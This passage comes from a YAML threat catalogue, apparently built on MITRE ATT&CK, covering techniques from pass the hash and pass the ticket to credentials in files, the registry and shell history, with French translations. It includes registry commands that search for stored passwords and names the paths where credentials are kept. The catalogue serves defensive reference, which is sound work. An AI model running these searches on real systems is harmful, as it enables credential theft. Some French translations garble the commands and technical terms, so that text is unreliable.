          \ h\xE9rite de l\u2019acc\xE8s \xE0 tous les fichiers du syst\xE8me sans\
          \ n\xE9cessiter d\u2019invitation utilisateur. Lorsque la protection d\u2019\
          int\xE9grit\xE9 du syst\xE8me (SIP) est d\xE9sactiv\xE9e, les protections\
          \ TCC sont \xE9galement d\xE9sactiv\xE9es. Pour un syst\xE8me sans SIP activ\xE9\
          , les adversaires peuvent manipuler la base de donn\xE9es TCC pour ajouter\
          \ des permissions \xE0 leur ex\xE9cutable malveillant en chargeant une base\
          \ de donn\xE9es TCC contr\xF4l\xE9e par l\u2019adversaire en utilisant des\
          \ variables d\u2019environnement et [Launchctl](https://attack.mitre.org/techniques/T1569/001).\
          \ (Citation : contournement TCC macOS)(Citation : Base de donn\xE9es TCC)\n\
          https://attack.mitre.org/techniques/T1548/006"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1550
    ref_id: T1550
    name: Use Alternate Authentication Material
    description: "Adversaries may use alternate authentication material, such as password\
      \ hashes, Kerberos tickets, and application access tokens, in order to move\
      \ laterally within an environment and bypass normal system access controls.\
      \ \n\nAuthentication processes generally require a valid identity (e.g., username)\
      \ along with one or more authentication factors (e.g., password, pin, physical\
      \ smart card, token generator, etc.). Alternate authentication material is legitimately\
      \ generated by systems after a user or application successfully authenticates\
      \ by providing a valid identity and the required authentication factor(s). Alternate\
      \ authentication material may also be generated during the identity creation\
      \ process.(Citation: NIST Authentication)(Citation: NIST MFA)\n\nCaching alternate\
      \ authentication material allows the system to verify an identity has successfully\
      \ authenticated without asking the user to reenter authentication factor(s).\
      \ Because the alternate authentication must be maintained by the system\u2014\
      either in memory or on disk\u2014it may be at risk of being stolen through [Credential\
      \ Access](https://attack.mitre.org/tactics/TA0006) techniques. By stealing alternate\
      \ authentication material, adversaries are able to bypass system access controls\
      \ and authenticate to systems without knowing the plaintext password or any\
      \ additional authentication factors.\nhttps://attack.mitre.org/techniques/T1550"
    translations:
      fr:
        name: "Utiliser du mat\xE9riel d\u2019authentification alternatif"
        description: "Les adversaires peuvent utiliser des mat\xE9riaux d\u2019authentification\
          \ alternatifs, tels que les hachages de mots de passe, les tickets Kerberos\
          \ et les jetons d\u2019acc\xE8s applicatifs, afin de se d\xE9placer lat\xE9\
          ralement dans un environnement et contourner les contr\xF4les d\u2019acc\xE8\
          s syst\xE8me normaux. \n\nLes processus d\u2019authentification n\xE9cessitent\
          \ g\xE9n\xE9ralement une identit\xE9 valide (par exemple, un nom d\u2019\
          utilisateur) ainsi qu\u2019un ou plusieurs facteurs d\u2019authentification\
          \ (par exemple, mot de passe, code PIN, carte \xE0 puce physique, g\xE9\
          n\xE9rateur de jetons, etc.). Le mat\xE9riel d\u2019authentification alternatif\
          \ est l\xE9gitimement g\xE9n\xE9r\xE9 par les syst\xE8mes apr\xE8s qu\u2019\
          un utilisateur ou une application a r\xE9ussi \xE0 authentifier en fournissant\
          \ une identit\xE9 valide et le(s) facteur d\u2019authentification requis.\
          \ Des mat\xE9riaux d\u2019authentification alternatifs peuvent \xE9galement\
          \ \xEAtre g\xE9n\xE9r\xE9s lors du processus de cr\xE9ation d\u2019identit\xE9\
          . (Citation : Authentification NIST)(Citation : NIST MFA)\n\nLa mise en\
          \ cache du mat\xE9riel d\u2019authentification alternatif permet au syst\xE8\
          me de v\xE9rifier qu\u2019une identit\xE9 a \xE9t\xE9 authentifi\xE9e avec\
          \ succ\xE8s sans demander \xE0 l\u2019utilisateur de rentrer le ou les facteurs\
          \ d\u2019authentification. Parce que l\u2019authentification alternative\
          \ doit \xEAtre maintenue par le syst\xE8me\u2014soit en m\xE9moire, soit\
          \ sur disque\u2014elle peut \xEAtre expos\xE9e au risque d\u2019\xEAtre\
          \ vol\xE9e via les techniques de [Acc\xE8s aux Cr\xE9dents](https://attack.mitre.org/tactics/TA0006).\
          \ En volant du mat\xE9riel d\u2019authentification alternatif, les adversaires\
          \ peuvent contourner les contr\xF4les d\u2019acc\xE8s syst\xE8me et s\u2019\
          authentifier aux syst\xE8mes sans conna\xEEtre le mot de passe en clair\
          \ ni aucun autre facteur d\u2019authentification.\nhttps://attack.mitre.org/techniques/T1550"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1550.001
    ref_id: T1550.001
    name: Application Access Token
    description: "Adversaries may use stolen application access tokens to bypass the\
      \ typical authentication process and access restricted accounts, information,\
      \ or services on remote systems. These tokens are typically stolen from users\
      \ or services and used in lieu of login credentials.\n\nApplication access tokens\
      \ are used to make authorized API requests on behalf of a user or service and\
      \ are commonly used to access resources in cloud, container-based applications,\
      \ and software-as-a-service (SaaS).(Citation: Auth0 - Why You Should Always\
      \ Use Access Tokens to Secure APIs Sept 2019) \n\nOAuth is one commonly implemented\
      \ framework that issues tokens to users for access to systems. These frameworks\
      \ are used collaboratively to verify the user and determine what actions the\
      \ user is allowed to perform. Once identity is established, the token allows\
      \ actions to be authorized, without passing the actual credentials of the user.\
      \ Therefore, compromise of the token can grant the adversary access to resources\
      \ of other sites through a malicious application.(Citation: okta)\n\nFor example,\
      \ with a cloud-based email service, once an OAuth access token is granted to\
      \ a malicious application, it can potentially gain long-term access to features\
      \ of the user account if a \"refresh\" token enabling background access is awarded.(Citation:\
      \ Microsoft Identity Platform Access 2019) With an OAuth access token an adversary\
      \ can use the user-granted REST API to perform functions such as email searching\
      \ and contact enumeration.(Citation: Staaldraad Phishing with OAuth 2017)\n\n\
      Compromised access tokens may be used as an initial step in compromising other\
      \ services. For example, if a token grants access to a victim\u2019s primary\
      \ email, the adversary may be able to extend access to all other services which\
      \ the target subscribes by triggering forgotten password routines. In AWS and\
      \ GCP environments, adversaries can trigger a request for a short-lived access\
      \ token with the privileges of another user account.(Citation: Google Cloud\
      \ Service Account Credentials)(Citation: AWS Temporary Security Credentials)\
      \ The adversary can then use this token to request data or perform actions the\
      \ original account could not. If permissions for this feature are misconfigured\
      \ \u2013 for example, by allowing all users to request a token for a particular\
      \ account - an adversary may be able to gain initial access to a Cloud Account\
      \ or escalate their privileges.(Citation: Rhino Security Labs Enumerating AWS\
      \ Roles)\n\nDirect API access through a token negates the effectiveness of a\
      \ second authentication factor and may be immune to intuitive countermeasures\
      \ like changing passwords.  For example, in AWS environments, an adversary who\
      \ compromises a user\u2019s AWS API credentials may be able to use the `sts:GetFederationToken`\
      \ API call to create a federated user session, which will have the same permissions\
      \ as the original user but may persist even if the original user credentials\
      \ are deactivated.(Citation: Crowdstrike AWS User Federation Persistence) Additionally,\
      \ access abuse over an API channel can be difficult to detect even from the\
      \ service provider end, as the access can still align well with a legitimate\
      \ workflow.\nhttps://attack.mitre.org/techniques/T1550/001"
    translations:
      fr:
        name: "Jeton d\u2019acc\xE8s \xE0 l\u2019application"
        description: "Les attaquants peuvent utiliser des jetons d'acc\xE8s \xE0 des\
          \ applications vol\xE9s pour contourner le processus d'authentification\
          \ habituel et acc\xE9der \xE0 des comptes, des informations ou des services\
          \ restreints sur des syst\xE8mes distants. Ces jetons sont g\xE9n\xE9ralement\
          \ vol\xE9s \xE0 des utilisateurs ou \xE0 des services et utilis\xE9s \xE0\
          \ la place des identifiants de connexion.\n\nLes jetons d\u2019acc\xE8s\
          \ aux applications servent \xE0 effectuer des requ\xEAtes API autoris\xE9\
          es au nom d\u2019un utilisateur ou d\u2019un service ; ils sont couramment\
          \ utilis\xE9s pour acc\xE9der \xE0 des ressources dans le cloud, dans des\
          \ applications bas\xE9es sur des conteneurs et dans des solutions SaaS (Software-as-a-Service).\
          \ (R\xE9f\xE9rence : Auth0 \u2013 Pourquoi vous devriez toujours utiliser\
          \ des jetons d\u2019acc\xE8s pour s\xE9curiser les API, septembre 2019)\
          \ \n\nOAuth est l\u2019un des frameworks couramment mis en \u0153uvre qui\
          \ d\xE9livre des jetons aux utilisateurs pour leur permettre d\u2019acc\xE9\
          der aux syst\xE8mes. Ces frameworks sont utilis\xE9s conjointement pour\
          \ v\xE9rifier l\u2019identit\xE9 de l\u2019utilisateur et d\xE9terminer\
          \ les actions qu\u2019il est autoris\xE9 \xE0 effectuer. Une fois l\u2019\
          identit\xE9 \xE9tablie, le jeton permet d\u2019autoriser des actions sans\
          \ transmettre les identifiants r\xE9els de l\u2019utilisateur. Par cons\xE9\
          quent, la compromission du jeton peut permettre \xE0 un attaquant d\u2019\
          acc\xE9der aux ressources d\u2019autres sites via une application malveillante.\
          \ (R\xE9f\xE9rence : Okta)\n\nPar exemple, dans le cas d\u2019un service\
          \ de messagerie \xE9lectronique bas\xE9 sur le cloud, d\xE8s qu\u2019un\
          \ jeton d\u2019acc\xE8s OAuth est accord\xE9 \xE0 une application malveillante,\
          \ celle-ci peut potentiellement obtenir un acc\xE8s \xE0 long terme aux\
          \ fonctionnalit\xE9s du compte utilisateur si un jeton de \xAB rafra\xEE\
          chissement \xBB permettant un acc\xE8s en arri\xE8re-plan lui est attribu\xE9\
          . (Source : Microsoft Identity Platform Access 2019) Gr\xE2ce \xE0 un jeton\
          \ d\u2019acc\xE8s OAuth, un attaquant peut utiliser l\u2019API REST autoris\xE9\
          e par l\u2019utilisateur pour effectuer des op\xE9rations telles que la\
          \ recherche d\u2019e-mails et le recensement des contacts. (Source : Staaldraad,\
          \ \xAB Phishing with OAuth \xBB, 2017)\n\nLes jetons d\u2019acc\xE8s compromis\
          \ peuvent servir de point de d\xE9part pour compromettre d\u2019autres services.\
          \ Par exemple, si un jeton donne acc\xE8s \xE0 la messagerie principale\
          \ d\u2019une victime, l\u2019attaquant peut \xEAtre en mesure d\u2019\xE9\
          tendre son acc\xE8s \xE0 tous les autres services auxquels la cible est\
          \ abonn\xE9e en d\xE9clenchant les proc\xE9dures de r\xE9initialisation\
          \ de mot de passe. Dans les environnements AWS et GCP, les attaquants peuvent\
          \ d\xE9clencher une demande de jeton d\u2019acc\xE8s \xE0 dur\xE9e de vie\
          \ limit\xE9e dot\xE9 des privil\xE8ges d\u2019un autre compte utilisateur.\
          \ (R\xE9f\xE9rence : Google Cloud Service Account Credentials) (R\xE9f\xE9\
          rence : AWS Temporary Security Credentials) L\u2019attaquant peut alors\
          \ utiliser ce jeton pour demander des donn\xE9es ou effectuer des actions\
          \ que le compte d\u2019origine ne pouvait pas r\xE9aliser. Si les autorisations\
          \ relatives \xE0 cette fonctionnalit\xE9 sont mal configur\xE9es \u2013\
          \ par exemple, en autorisant tous les utilisateurs \xE0 demander un jeton\
          \ pour un compte particulier \u2013, un attaquant peut \xEAtre en mesure\
          \ d\u2019obtenir un acc\xE8s initial \xE0 un compte cloud ou d\u2019\xE9\
          lever ses privil\xE8ges. (R\xE9f\xE9rence : Rhino Security Labs Enumerating\
          \ AWS Roles)\n\nL'acc\xE8s direct \xE0 l'API via un jeton rend inefficace\
          \ le deuxi\xE8me facteur d'authentification et peut \xE9chapper \xE0 des\
          \ contre-mesures intuitives telles que le changement de mot de passe. Par\
          \ exemple, dans les environnements AWS, un attaquant qui parvient \xE0 compromettre\
          \ les identifiants API AWS d'un utilisateur peut \xEAtre en mesure d'utiliser\
          \ l'appel API `sts:GetFederationToken` pour cr\xE9er une session utilisateur\
          \ f\xE9d\xE9r\xE9e, qui disposera des m\xEAmes autorisations que l'utilisateur\
          \ d'origine mais pourra persister m\xEAme si les identifiants de ce dernier\
          \ sont d\xE9sactiv\xE9s. (R\xE9f\xE9rence : Crowdstrike AWS User Federation\
          \ Persistence) De plus, l\u2019utilisation abusive d\u2019un acc\xE8s via\
          \ un canal API peut \xEAtre difficile \xE0 d\xE9tecter, m\xEAme du c\xF4\
          t\xE9 du fournisseur de services, car cet acc\xE8s peut tout \xE0 fait s\u2019\
          inscrire dans un flux de travail l\xE9gitime.\nhttps://attack.mitre.org/techniques/T1550/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1550.002
    ref_id: T1550.002
    name: Pass the Hash
    description: "Adversaries may \u201Cpass the hash\u201D using stolen password\
      \ hashes to move laterally within an environment, bypassing normal system access\
      \ controls. Pass the hash (PtH) is a method of authenticating as a user without\
      \ having access to the user's cleartext password. This method bypasses standard\
      \ authentication steps that require a cleartext password, moving directly into\
      \ the portion of the authentication that uses the password hash.\n\nWhen performing\
      \ PtH, valid password hashes for the account being used are captured using a\
      \ [Credential Access](https://attack.mitre.org/tactics/TA0006) technique. Captured\
      \ hashes are used with PtH to authenticate as that user. Once authenticated,\
      \ PtH may be used to perform actions on local or remote systems.\n\nAdversaries\
      \ may also use stolen password hashes to \"overpass the hash.\" Similar to PtH,\
      \ this involves using a password hash to authenticate as a user but also uses\
      \ the password hash to create a valid Kerberos ticket. This ticket can then\
      \ be used to perform [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003)\
      \ attacks.(Citation: Stealthbits Overpass-the-Hash)\nhttps://attack.mitre.org/techniques/T1550/002"
    translations:
      fr:
        name: Passez le Hash
        description: "Les adversaires peuvent \xAB passer le hachage \xBB en utilisant\
          \ des hachages de mots de passe vol\xE9s pour se d\xE9placer lat\xE9ralement\
          \ dans un environnement, contournant ainsi les contr\xF4les d\u2019acc\xE8\
          s syst\xE8me normaux. Le hachage pass (PtH) est une m\xE9thode d\u2019authentification\
          \ en tant qu\u2019utilisateur sans avoir acc\xE8s au mot de passe en clair\
          \ de l\u2019utilisateur. Cette m\xE9thode contourne les \xE9tapes d\u2019\
          authentification standard qui n\xE9cessitent un mot de passe en clair, passant\
          \ directement \xE0 la partie de l\u2019authentification qui utilise le hachage\
          \ du mot de passe.\n\nLors de l\u2019ex\xE9cution du PtH, les hachages de\
          \ mots de passe valides pour le compte utilis\xE9 sont captur\xE9s \xE0\
          \ l\u2019aide d\u2019une technique [Acc\xE8s aux cr\xE9dents](https://attack.mitre.org/tactics/TA0006).\
          \ Les hachages captur\xE9s sont utilis\xE9s avec PtH pour authentifier cet\
          \ utilisateur. Une fois authentifi\xE9, PtH peut \xEAtre utilis\xE9 pour\
          \ effectuer des actions sur des syst\xE8mes locaux ou distants.\n\nLes adversaires\
          \ peuvent \xE9galement utiliser des hachages de mots de passe vol\xE9s pour\
          \ \xAB d\xE9passer le hachage \xBB. \xC0 l\u2019instar de PtH, cela consiste\
          \ \xE0 utiliser un hachage de mot de passe pour s\u2019authentifier en tant\
          \ qu\u2019utilisateur, mais aussi \xE0 utiliser le hachage du mot de passe\
          \ pour cr\xE9er un ticket Kerberos valide. Ce ticket peut ensuite \xEAtre\
          \ utilis\xE9 pour effectuer des attaques [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003).\
          \ (Citation : Furtivit\xE9 surpassent le hash)\nhttps://attack.mitre.org/techniques/T1550/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1550.003
    ref_id: T1550.003
    name: Pass the Ticket
    description: "Adversaries may \u201Cpass the ticket\u201D using stolen Kerberos\
      \ tickets to move laterally within an environment, bypassing normal system access\
      \ controls. Pass the ticket (PtT) is a method of authenticating to a system\
      \ using Kerberos tickets without having access to an account's password. Kerberos\
      \ authentication can be used as the first step to lateral movement to a remote\
      \ system.\n\nWhen preforming PtT, valid Kerberos tickets for [Valid Accounts](https://attack.mitre.org/techniques/T1078)\
      \ are captured by [OS Credential Dumping](https://attack.mitre.org/techniques/T1003).\
      \ A user's service tickets or ticket granting ticket (TGT) may be obtained,\
      \ depending on the level of access. A service ticket allows for access to a\
      \ particular resource, whereas a TGT can be used to request service tickets\
      \ from the Ticket Granting Service (TGS) to access any resource the user has\
      \ privileges to access.(Citation: ADSecurity AD Kerberos Attacks)(Citation:\
      \ GentilKiwi Pass the Ticket)\n\nA [Silver Ticket](https://attack.mitre.org/techniques/T1558/002)\
      \ can be obtained for services that use Kerberos as an authentication mechanism\
      \ and are used to generate tickets to access that particular resource and the\
      \ system that hosts the resource (e.g., SharePoint).(Citation: ADSecurity AD\
      \ Kerberos Attacks)\n\nA [Golden Ticket](https://attack.mitre.org/techniques/T1558/001)\
      \ can be obtained for the domain using the Key Distribution Service account\
      \ KRBTGT account NTLM hash, which enables generation of TGTs for any account\
      \ in Active Directory.(Citation: Campbell 2014)\n\nAdversaries may also create\
      \ a valid Kerberos ticket using other user information, such as stolen password\
      \ hashes or AES keys. For example, \"overpassing the hash\" involves using a\
      \ NTLM password hash to authenticate as a user (i.e. [Pass the Hash](https://attack.mitre.org/techniques/T1550/002))\
      \ while also using the password hash to create a valid Kerberos ticket.(Citation:\
      \ Stealthbits Overpass-the-Hash)\nhttps://attack.mitre.org/techniques/T1550/003"
    translations:
      fr:
        name: Passez le billet
        description: "Les adversaires peuvent \xAB passer le ticket \xBB en utilisant\
          \ des tickets Kerberos vol\xE9s pour se d\xE9placer lat\xE9ralement dans\
          \ un environnement, contournant ainsi les contr\xF4les d\u2019acc\xE8s syst\xE8\
          me normaux. Pass the ticket (PtT) est une m\xE9thode d\u2019authentification\
          \ aupr\xE8s d\u2019un syst\xE8me en utilisant des tickets Kerberos sans\
          \ avoir acc\xE8s au mot de passe d\u2019un compte. L\u2019authentification\
          \ Kerberos peut \xEAtre utilis\xE9e comme premi\xE8re \xE9tape vers un d\xE9\
          placement lat\xE9ral vers un syst\xE8me distant.\n\nLors de l\u2019ex\xE9\
          cution de PtT, les tickets Kerberos valides pour [Comptes valides](https://attack.mitre.org/techniques/T1078)\
          \ sont captur\xE9s par [OS Credential Dumping](https://attack.mitre.org/techniques/T1003).\
          \ Un ticket de service ou un ticket d\u2019octroi de tickets (TGT) peut\
          \ \xEAtre obtenu, selon le niveau d\u2019acc\xE8s. Un ticket de service\
          \ permet d\u2019acc\xE9der \xE0 une ressource particuli\xE8re, tandis qu\u2019\
          un TGT peut \xEAtre utilis\xE9 pour demander des tickets de service au Service\
          \ d\u2019octroi de tickets (TGS) afin d\u2019acc\xE9der \xE0 toute ressource\
          \ \xE0 laquelle l\u2019utilisateur a des privil\xE8ges. (Citation : AD AD\
          \ Attaques de Kerberos)(Citation : Gentil Kiwi passe le ticket)\n\nUn [Silver\
          \ Ticket](https://attack.mitre.org/techniques/T1558/002) peut \xEAtre obtenu\
          \ pour des services utilisant Kerberos comme m\xE9canisme d\u2019authentification\
          \ et servant \xE0 g\xE9n\xE9rer des tickets pour acc\xE9der \xE0 cette ressource\
          \ particuli\xE8re et au syst\xE8me qui l\u2019h\xE9berge (par exemple, SharePoint).\
          \ (Citation : AD AD Attaques de Kerberos)\n\nUn [Golden Ticket](https://attack.mitre.org/techniques/T1558/001)\
          \ peut \xEAtre obtenu pour le domaine en utilisant le compte de service\
          \ de distribution de cl\xE9s KRBTGT compte NTLM hash, qui permet la g\xE9\
          n\xE9ration de TGT pour n\u2019importe quel compte dans Active Directory.\
          \ (Citation : Campbell 2014)\n\nLes adversaires peuvent \xE9galement cr\xE9\
          er un ticket Kerberos valide en utilisant d\u2019autres informations utilisateur,\
          \ telles que des hachages de mots de passe vol\xE9s ou des cl\xE9s AES.\
          \ Par exemple, \xAB d\xE9passer le hachage \xBB consiste \xE0 utiliser un\
          \ hachage de mot de passe NTLM pour s\u2019authentifier en tant qu\u2019\
          utilisateur (c\u2019est-\xE0-dire [Pass the Hash](https://attack.mitre.org/techniques/T1550/002))\
          \ tout en utilisant le hachage du mot de passe pour cr\xE9er un ticket Kerberos\
          \ valide. (Citation : Furtivit\xE9 surpassent le hash)\nhttps://attack.mitre.org/techniques/T1550/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1550.004
    ref_id: T1550.004
    name: Web Session Cookie
    description: 'Adversaries can use stolen session cookies to authenticate to web
      applications and services. This technique bypasses some multi-factor authentication
      protocols since the session is already authenticated.(Citation: Pass The Cookie)


      Authentication cookies are commonly used in web applications, including cloud-based
      services, after a user has authenticated to the service so credentials are not
      passed and re-authentication does not need to occur as frequently. Cookies are
      often valid for an extended period of time, even if the web application is not
      actively used. After the cookie is obtained through [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)
      or [Web Cookies](https://attack.mitre.org/techniques/T1606/001), the adversary
      may then import the cookie into a browser they control and is then able to use
      the site or application as the user for as long as the session cookie is active.
      Once logged into the site, an adversary can access sensitive information, read
      email, or perform actions that the victim account has permissions to perform.


      There have been examples of malware targeting session cookies to bypass multi-factor
      authentication systems.(Citation: Unit 42 Mac Crypto Cookies January 2019)

      https://attack.mitre.org/techniques/T1550/004'
    translations:
      fr:
        name: Web Session Cookie
        description: "Les adversaires peuvent utiliser des cookies de session vol\xE9\
          s pour s\u2019authentifier aupr\xE8s d\u2019applications et services web.\
          \ Cette technique contourne certains protocoles d\u2019authentification\
          \ multifactorielle puisque la session est d\xE9j\xE0 authentifi\xE9e. (Citation\
          \ : Passe le biscuit)\n\nLes cookies d\u2019authentification sont couramment\
          \ utilis\xE9s dans les applications web, y compris les services cloud, apr\xE8\
          s qu\u2019un utilisateur s\u2019est authentifi\xE9 au service, de sorte\
          \ que les identifiants ne sont pas transmis et que la r\xE9authentification\
          \ n\u2019a pas besoin d\u2019\xEAtre aussi fr\xE9quente. Les cookies sont\
          \ souvent valides pendant une longue p\xE9riode, m\xEAme si l\u2019application\
          \ web n\u2019est pas activement utilis\xE9e. Apr\xE8s que le cookie a \xE9\
          t\xE9 obtenu via [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)\
          \ ou [Web Cookies](https://attack.mitre.org/techniques/T1606/001), l\u2019\
          adversaire peut alors importer le cookie dans un navigateur qu\u2019il contr\xF4\
          le et peut utiliser le site ou l\u2019application en tant qu\u2019utilisateur\
          \ tant que le cookie de session est actif. Une fois connect\xE9 au site,\
          \ un adversaire peut acc\xE9der \xE0 des informations sensibles, lire des\
          \ e-mails ou effectuer des actions que le compte victime a l\u2019autorisation\
          \ d\u2019accomplir.\n\nIl y a eu des exemples de malwares ciblant les cookies\
          \ de session pour contourner les syst\xE8mes d\u2019authentification multifacteurs.\
          \ (Citation : Cookies crypto Mac Unit 42 janvier 2019)\nhttps://attack.mitre.org/techniques/T1550/004"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1552
    ref_id: T1552
    name: Unsecured Credentials
    description: 'Adversaries may search compromised systems to find and obtain insecurely
      stored credentials. These credentials can be stored and/or misplaced in many
      locations on a system, including plaintext files (e.g. [Shell History](https://attack.mitre.org/techniques/T1552/003)),
      operating system or application-specific repositories (e.g. [Credentials in
      Registry](https://attack.mitre.org/techniques/T1552/002)),  or other specialized
      files/artifacts (e.g. [Private Keys](https://attack.mitre.org/techniques/T1552/004)).(Citation:
      Brining MimiKatz to Unix)'
    translations:
      fr:
        name: "Identifiants non s\xE9curis\xE9s"
        description: "Les adversaires peuvent fouiller les syst\xE8mes compromis pour\
          \ trouver et obtenir des identifiants stock\xE9s de mani\xE8re non s\xE9\
          curis\xE9e. Ces identifiants peuvent \xEAtre stock\xE9s et/ou \xE9gar\xE9\
          s \xE0 de nombreux endroits d\u2019un syst\xE8me, y compris des fichiers\
          \ en clair (par exemple [Historique du shell](https://attack.mitre.org/techniques/T1552/003)),\
          \ des d\xE9p\xF4ts sp\xE9cifiques au syst\xE8me d\u2019exploitation ou \xE0\
          \ une application (par exemple [Identifiants dans le registre](https://attack.mitre.org/techniques/T1552/002)),\
          \ ou d\u2019autres fichiers/artefacts sp\xE9cialis\xE9s (par exemple [Cl\xE9\
          s priv\xE9es](https://attack.mitre.org/techniques/T1552/004)). (Citation\
          \ : Apporter MimiKatz \xE0 Unix)"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1552.001
    ref_id: T1552.001
    name: Credentials In Files
    description: 'Adversaries may search local file systems and remote file shares
      for files containing insecurely stored credentials. These can be files created
      by users to store their own credentials, shared credential stores for a group
      of individuals, configuration files containing passwords for a system or service,
      or source code/binary files containing embedded passwords.


      It is possible to extract passwords from backups or saved virtual machines through
      [OS Credential Dumping](https://attack.mitre.org/techniques/T1003).(Citation:
      CG 2014) Passwords may also be obtained from Group Policy Preferences stored
      on the Windows Domain Controller.(Citation: SRD GPP)


      In cloud and/or containerized environments, authenticated user and service account
      credentials are often stored in local configuration and credential files.(Citation:
      Unit 42 Hildegard Malware) They may also be found as parameters to deployment
      commands in container logs.(Citation: Unit 42 Unsecured Docker Daemons) In some
      cases, these files can be copied and reused on another machine or the contents
      can be read and then used to authenticate without needing to copy any files.(Citation:
      Specter Ops - Cloud Credential Storage)

      https://attack.mitre.org/techniques/T1552/001'
    translations:
      fr:
        name: "Accr\xE9ditations dans les dossiers"
        description: "Les adversaires peuvent rechercher dans les syst\xE8mes de fichiers\
          \ locaux et les partages de fichiers distants pour des fichiers contenant\
          \ des identifiants stock\xE9s de mani\xE8re non s\xE9curis\xE9e. Il peut\
          \ s\u2019agir de fichiers cr\xE9\xE9s par les utilisateurs pour stocker\
          \ leurs propres identifiants, de stockages partag\xE9s de cr\xE9dences pour\
          \ un groupe d\u2019individus, de fichiers de configuration contenant des\
          \ mots de passe pour un syst\xE8me ou service, ou de fichiers code source/binaires\
          \ contenant des mots de passe int\xE9gr\xE9s.\n\nIl est possible d\u2019\
          extraire des mots de passe \xE0 partir de sauvegardes ou de machines virtuelles\
          \ sauvegard\xE9es via [OS Credential Dumping](https://attack.mitre.org/techniques/T1003).\
          \ (Citation : CG 2014) Les mots de passe peuvent \xE9galement \xEAtre obtenus\
          \ \xE0 partir des Pr\xE9f\xE9rences de Strat\xE9gie de Groupe stock\xE9\
          es sur le Contr\xF4leur de Domaine Windows. (Citation : SRD GPP)\n\nDans\
          \ les environnements cloud et/ou conteneuris\xE9s, les identifiants authentifi\xE9\
          s des comptes utilisateurs et de services sont souvent stock\xE9s dans des\
          \ fichiers de configuration et d\u2019identifiants locaux. (Citation : Unit\xE9\
          \ 42 Malware Hildegard) Ils peuvent \xE9galement \xEAtre trouv\xE9s comme\
          \ param\xE8tres pour les commandes de d\xE9ploiement dans les journaux de\
          \ conteneurs. (Citation : D\xE9mons dockers non s\xE9curis\xE9s de l\u2019\
          Unit\xE9 42) Dans certains cas, ces fichiers peuvent \xEAtre copi\xE9s et\
          \ r\xE9utilis\xE9s sur une autre machine ou leur contenu peut \xEAtre lu\
          \ puis utilis\xE9 pour authentifier sans avoir besoin de copier de fichiers.\
          \ (Citation : Specter Ops - Stockage des cr\xE9dentials cloud)\nhttps://attack.mitre.org/techniques/T1552/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1552.002
    ref_id: T1552.002
    name: Credentials in Registry
    description: 'Adversaries may search the Registry on compromised systems for insecurely
      stored credentials. The Windows Registry stores configuration information that
      can be used by the system or other programs. Adversaries may query the Registry
      looking for credentials and passwords that have been stored for use by other
      programs or services. Sometimes these credentials are used for automatic logons.


      Example commands to find Registry keys related to password information: (Citation:
      Pentestlab Stored Credentials)


      * Local Machine Hive: <code>reg query HKLM /f password /t REG_SZ /s</code>

      * Current User Hive: <code>reg query HKCU /f password /t REG_SZ /s</code>

      https://attack.mitre.org/techniques/T1552/002'
    translations:
      fr:
        name: "Accr\xE9ditations dans le registre"
        description: "Les adversaires peuvent rechercher dans le registre des syst\xE8\
          mes compromis pour d\xE9tecter des identifiants stock\xE9s de mani\xE8re\
          \ non s\xE9curis\xE9e. Le Registre Windows stocke des informations de configuration\
          \ pouvant \xEAtre utilis\xE9es par le syst\xE8me ou d\u2019autres programmes.\
          \ Les adversaires peuvent interroger le Registre \xE0 la recherche d\u2019\
          identifiants et de mots de passe qui ont \xE9t\xE9 stock\xE9s pour \xEA\
          tre utilis\xE9s par d\u2019autres programmes ou services. Parfois, ces identifiants\
          \ sont utilis\xE9s pour des connexions automatiques.\n\nExemples de commandes\
          \ pour trouver les cl\xE9s du registre li\xE9es aux informations de mot\
          \ de passe : (Citation : Pentestlab Stored Credentials)\n\n* Ruche de machine\
          \ locale : <code>requ\xEAte de r\xE9f\xE9rence HKLM /f mot de passe /t REG_SZ\
          \ /s</code>\n* Ruche utilisateur actuel : <code>requ\xEAte r\xE9glementaire\
          \ HKCU /f mot de passe /t REG_SZ /s</code>\nhttps://attack.mitre.org/techniques/T1552/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1552.003
    ref_id: T1552.003
    name: Shell History
    description: 'Adversaries may search the command history on compromised systems
      for insecurely stored credentials.


      On Linux and macOS systems, shells such as Bash and Zsh keep track of the commands
      users type on the command-line with the "history" utility. Once a user logs
      out, the history is flushed to the user''s history file. For each user, this
      file resides at the same location: for example, `~/.bash_history` or `~/.zsh_history`.
      Typically, these files keeps track of the user''s last 1000 commands.


      On Windows, PowerShell has both a command history that is wiped after the session
      ends, and one that contains commands used in all sessions and is persistent.
      The default location for persistent history can be found in `%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`,
      but command history can also be accessed with `Get-History`. Command Prompt
      (CMD) on Windows does not have persistent history.(Citation: Microsoft about_History)(Citation:
      Medium)


      Users often type usernames and passwords on the command-line as parameters to
      programs, which then get saved to this file when they log out. Adversaries can
      abuse this by looking through the file for potential credentials.(Citation:
      External to DA, the OS X Way)

      https://attack.mitre.org/techniques/T1552/003'
    translations:
      fr:
        name: Histoire de Shell
        description: "Les adversaires peuvent rechercher dans l\u2019historique des\
          \ commandes des syst\xE8mes compromis pour d\xE9tecter des identifiants\
          \ stock\xE9s de mani\xE8re non s\xE9curis\xE9e.\n\nSur les syst\xE8mes Linux\
          \ et macOS, des shells comme Bash et Zsh suivent les commandes saisies par\
          \ les utilisateurs en ligne de commande avec l\u2019utilitaire \xAB historique\
          \ \xBB. Une fois qu\u2019un utilisateur se d\xE9connecte, l\u2019historique\
          \ est vid\xE9 dans le fichier historique de l\u2019utilisateur. Pour chaque\
          \ utilisateur, ce fichier se trouve au m\xEAme endroit : par exemple, \xAB\
          \ ~/.bash_history \xBB ou \xAB ~/.zsh_history \xBB. En g\xE9n\xE9ral, ces\
          \ fichiers enregistrent les 1000 derni\xE8res commandes de l\u2019utilisateur.\n\
